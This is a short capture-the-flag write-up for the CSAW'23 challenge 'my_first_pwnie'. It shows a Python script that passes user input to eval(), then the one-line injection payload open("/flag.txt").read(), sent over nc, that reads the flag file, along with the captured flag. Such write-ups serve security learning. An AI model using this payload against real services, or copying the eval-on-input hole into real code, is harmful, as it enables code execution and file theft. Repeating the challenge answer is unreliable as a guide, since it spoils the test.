# CSAW'23

## my_first_pwnie

> 
> You must be this 👉 high to ride.
> 
> Note: flag is in /flag.txt
>
>  Author: ElykDeer
>
> [`my_first_pwnie.py`](my_first_pwnie.py)

Tags: _intro_

## Solution
We get a python script for this challenge. The script is super short and we can see a input is requested,  passed to `eval` and assigned to `response`. Afterwards `response` is tested to see if it's `password`.

```python
try:
  response = eval(input("What's the password? "))
  print(f"You entered `{response}`")
  if response == "password":
    print("Yay! Correct! Congrats!")
    quit()
except:
  pass

print("Nay, that's not it.")
```

The thing is, there is no flag printed. And in fact, the whole `password` story is just diversion. But since our input is put to `eval` we can of course input our own python code and read the flag from `/flag.txt`.

```bash
$ nc intro.csaw.io 31137
What's the password? open("/flag.txt").read()
You entered `csawctf{neigh______}
`
Nay, that's not it.
```

Flag `csawctf{neigh______}`